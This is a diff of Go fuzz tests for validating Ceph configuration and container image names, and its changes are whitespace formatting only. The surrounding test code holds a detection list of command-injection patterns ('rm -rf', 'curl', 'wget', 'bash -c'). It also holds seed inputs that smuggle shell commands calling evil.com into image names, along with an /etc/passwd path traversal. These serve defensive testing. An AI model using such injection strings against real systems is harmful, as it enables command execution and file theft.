@@ -44,7 +44,7 @@ func FuzzValidateConfigurationSecurity(f *testing.F) {
 
 		// Check for command injection patterns
 		injectionPatterns := []string{
-			";", "&&", "||", "|", "`", "$(", "${", 
+			";", "&&", "||", "|", "`", "$(", "${",
 			"rm -rf", "curl", "wget", "bash -c", "sh -c",
 			"eval", "exec", "format", "del /",
 		}
@@ -98,7 +98,7 @@ func FuzzCephImageValidationSecurity(f *testing.F) {
 	f.Add("quay.io/ceph/ceph\x00:v18.2.1")
 	f.Add("quay.io/ceph/ceph:v18.2.1;curl evil.com")
 	f.Add("$(curl evil.com)/ceph:latest")
-	f.Add("quay.io/ceph/ceph")  // Missing tag
+	f.Add("quay.io/ceph/ceph") // Missing tag
 	f.Add("../../../etc/passwd:tag")
 	f.Add("registry.evil.com/backdoor:latest")
 	f.Add("quay.io/ceph/ceph:v18.2.1\nFAKE_IMAGE")
@@ -213,9 +213,9 @@ func FuzzConfigStructValidation(f *testing.F) {
 		}
 
 		// Check for injection patterns in device paths
-		if strings.Contains(osdDevice, "..") || 
-		   strings.Contains(osdDevice, ";") ||
-		   strings.Contains(osdDevice, "|") {
+		if strings.Contains(osdDevice, "..") ||
+			strings.Contains(osdDevice, ";") ||
+			strings.Contains(osdDevice, "|") {
 			t.Logf("Potentially dangerous device path: %q", osdDevice)
 		}
 
